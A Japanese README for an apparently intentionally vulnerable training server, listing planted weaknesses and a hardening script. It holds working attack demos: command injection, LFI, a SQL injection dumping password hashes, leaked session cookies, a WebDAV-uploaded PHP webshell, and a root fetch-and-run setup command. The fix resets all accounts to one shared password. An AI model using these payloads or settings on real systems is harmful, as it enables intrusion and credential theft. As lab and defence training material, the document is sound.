
# サーバー初期化方法

rootユーザーで実行してください。

```bash
curl -s -o /tmp/init.sh http://172.17.217.19/init.sh && sudo /bin/bash -c "chmod +x /tmp/init.sh; /tmp/init.sh 192.168.25.138"
```

# 脆弱性一覧

## 脆弱なユーザーパスワード

- `root`, `webadmin`ユーザーはユーザー名がパスワードになっている
- `user1` ~ `user10` はユーザー名がパスワードになっている

## 脆弱なsudo権限

- `user2`, `user3`, `user5`, `user6`, `user10`はsudoでどのようなコマンドも実行可能
- `user1`はsudoでfindコマンドを実行可能

## 脆弱なWEBアプリケーション

5000番ポートで動いているWEBアプリケーションはOSコマンドインジェクションが可能

```
┌──(ayato㉿LupinThe3rd)-[~/Fore/ayato-hardening-v2]
└─$ curl -X POST http://192.168.25.138:5000/api/ping --data '{"target": "1.1.1.1;id"}' -H "Content-Type: application/json" -s | jq
{
  "error": "",
  "output": "PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.\n64 bytes from 1.1.1.1: icmp_seq=1 ttl=128 time=3.45 ms\n\n--- 1.1.1.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 3.446/3.446/3.446/0.000 ms\nuid=1002(webadmin) gid=1002(webadmin) groups=1002(webadmin)\n"
}
```

## WEBアプリケーションのデバッグモードが有効

Flaskのデバッグモードが有効な上にデバッグ用PINが非常に脆弱である。

```
>>> import subprocess; res = subprocess.run("whoami", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); print(res.stdout.decode())
webadmin
```

## WEBアプリケーションではLFIが可能

```
┌──(ayato㉿LupinThe3rd)-[~/Fore/ayato-hardening-v2]
└─$ curl -X POST http://192.168.25.138:5000/api/logs -d "filename=/etc/passwd"   
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
<SNIP>
```

## 脆弱なWordPress管理者パスワード

80番で動いているWordPressはユーザー`admin`と`wpmanager`はユーザー名と同様のパスワードでログインが可能

## 脆弱なWordPressプラグイン: LiteSpeed Cache v6.4.1

ログインしたユーザーのCookie情報が外部へ漏洩する（CVE-2024-44000）

```
┌──(ayato㉿LupinThe3rd)-[~/Fore/ayato-hardening-v2]
└─$ curl http://192.168.25.138/wp-content/debug.log | grep Cookie
<SNIP>
10/27/25 15:23:08.509 [192.168.25.1:53803 1 zwj] Cookie: litespeed_tab=log_viewer; wordpress_e99b8b143447c3ffbd5b9523c97460ba=admin%7C1761718925%7C1ayyhnSZLLm2CVMFCoAljq5AHJtaual8zJivtRHbZMW%7C6b71035806aaa4c6fa6540245cf26b2eaec912ca7a5e35163f9b61aa1cec6e50; wordpress_test_cookie=WP%20Cookie%20check; wp_lang=ja; _lscache_vary=admin_bar%3A1%3Blogged-in%3A1%3Brole%3A99; wordpress_logged_in_e99b8b143447c3ffbd5b9523c97460ba=admin%7C1761718925%7C1ayyhnSZLLm2CVMFCoAljq5AHJtaual8zJivtRHbZMW%7C19a7713411595fba8c1dc6d38b672088b31afa0753946f131712e636750c0744; wp-settings-time-1=1761546127
<SNIP>
```

## 脆弱なWordPressプラグイン: Access Counter

デバッグ用Ajaxハンドラを通じてSQLインジェクションが可能

```
┌──(ayato㉿LupinThe3rd)-[~/Fore/ayato-hardening-v2]
└─$ curl -s -X POST --url "http://192.168.25.138/wp-admin/admin-ajax.php?action=ac_set_count" -d "select_table=users ; -- -"    
[*] Debug: SELECT * FROM wp_users ; -- - WHERE option_name = "ac_access_count";
    ID => 1
    user_login => admin
    user_pass => $wp$2y$10$xD3JCRVBoLg4GolzA561uumQvEzgnMy8V3.HauAuSq2MvzCLHRZTa
    user_nicename => admin
    user_email => example@example.com
    user_url => http://192.168.25.138
    user_registered => 2025-10-27 07:04:58
    user_activation_key =>
    user_status => 0
    display_name => admin
    ID => 2
    user_login => wpmanager
    user_pass => $wp$2y$10$tp6hW6czez3C7Fq419m16eU/HIinGZ09fSDKoqa.n02UuXPCzyGIu
    user_nicename => wpmanager
    user_email => wpmanager@example.com
    user_url =>
    user_registered => 2025-10-27 07:04:59
    user_activation_key =>
    user_status => 0
    display_name => wpmanager
[+] Executed
```

## 脆弱なMySQLのパスワード設定

MySQLはポートが外部に開放されており、`wpuser`は`wpuser`でログインが可能。

```
┌──(ayato㉿LupinThe3rd)-[~/Fore/ayato-hardening-v2]
└─$ mysql -h192.168.25.138 -uwpuser -pwpuser --skip-ssl-verify-server-cert
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 33
Server version: 8.0.43-0ubuntu0.24.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

## 脆弱なApacheのWebDAV設定

WebDAVが有効になっているためPUTでシェルを配置できる。

```
┌──(ayato㉿LupinThe3rd)-[~/Fore/ayato-hardening-v2]
└─$ echo '<?php system($_GET[0]); ?>' > /tmp/shell.php

┌──(ayato㉿LupinThe3rd)-[~/Fore/ayato-hardening-v2]
└─$ curl -X PUT -T /tmp/shell.php http://192.168.25.138/webshell.php
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webshell.php has been created.</p>
<hr />
<address>Apache/2.4.58 (Ubuntu) Server at 192.168.25.138 Port 80</address>
</body></html>

┌──(ayato㉿LupinThe3rd)-[~/Fore/ayato-hardening-v2]
└─$ curl http://192.168.25.138/webshell.php?0=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 脆弱なCrontabの出力権限設定

MySQLで動くCrontabはデータベースバックアップを取得して/tmpに出力する。出力したファイルは誰でも読むことができる。

```
root@ubuntu-srv-hardening-dev:~# ls -la  /tmp/dbbackups/
total 140
drwxr-xr-x  2 root root   4096 Oct 30 00:18 .
drwxrwxrwt 14 root root   4096 Oct 30 00:15 ..
-rwxr--r--  1 root root 132873 Oct 30 00:18 wp.sql
```

# フルハードニング

```bash
# 脆弱なユーザーパスワード
grep -Ff /etc/shells /etc/passwd | cut -d: -f1 | while read -r user; do
  echo "$user:StrongPWD123"
done | sudo chpasswd

# 脆弱なsudo権限
sudo cp /etc/sudoers /etc/sudoers.bak
sudo sed -i 's/NOPASSWD://g' /etc/sudoers

# 脆弱なWEBアプリケーション
# WEBアプリケーションのデバッグモードが有効
# WEBアプリケーションではLFIが可能
sed -i "/@app\.route('\/api\/ping'/ s/^/#/" /home/webadmin/app/app.py
sed -i "/@app\.route('\/api\/users'/ s/^/#/" /home/webadmin/app/app.py
sed -i "/[[:space:]]*os\.environ\['WERKZEUG_DEBUG_PIN'\]/ s/^/#/" /home/webadmin/app/app.py
sed -i "s/debug=True/debug=False/" /home/webadmin/app/app.py
sed -i "s|filename = request\.args\.get('filename') or request\.form\.get('filename')|filename = applog|" /home/webadmin/app/app.py
systemctl restart flaskapp

# 脆弱なWordPress管理者パスワード
# 脆弱なWordPressプラグイン: LiteSpeed Cache v6.4.1
# 脆弱なWordPressプラグイン: Access Counter
cd /var/www/html
NEWPASS='StrongPWD123'
for id in $(wp user list --field=ID --allow-root); do
  wp user update "$id" --user_pass="$NEWPASS" --allow-root
done
wp plugin update litespeed-cache --allow-root
wp config set WP_DEBUG false --raw --allow-root
wp config set WP_DEBUG_LOG false --raw --allow-root
wp config set WP_DEBUG_DISPLAY true --raw --allow-root
rm -rf /var/www/html/wp-content/debug.log
sed -i '/add_action("wp_ajax_ac_set_count", "ac_debug");/ s/^/\/\/ /; /add_action("wp_ajax_nopriv_ac_set_count", "ac_debug");/ s/^/\/\/ /' /var/www/html/wp-content/plugins/access-counter/access-counter.php

# 脆弱なMySQLのパスワード設定
sudo sed -i 's/^bind-address\s*=.*/bind-address = 127.0.0.1/' /etc/mysql/mysql.conf.d/mysqld.cnf
sudo systemctl restart mysql

## 脆弱なApacheのWebDAV設定
sudo sed -i 's/^[[:space:]]*Dav On/# &/' /etc/apache2/apache2.conf
systemctl restart apache2

## 脆弱なCrontabの出力権限設定
sudo sed -i 's/chmod[[:space:]]\+777/chmod 400/g' /usr/local/bin/db_backup.sh
/usr/local/bin/db_backup.sh
```
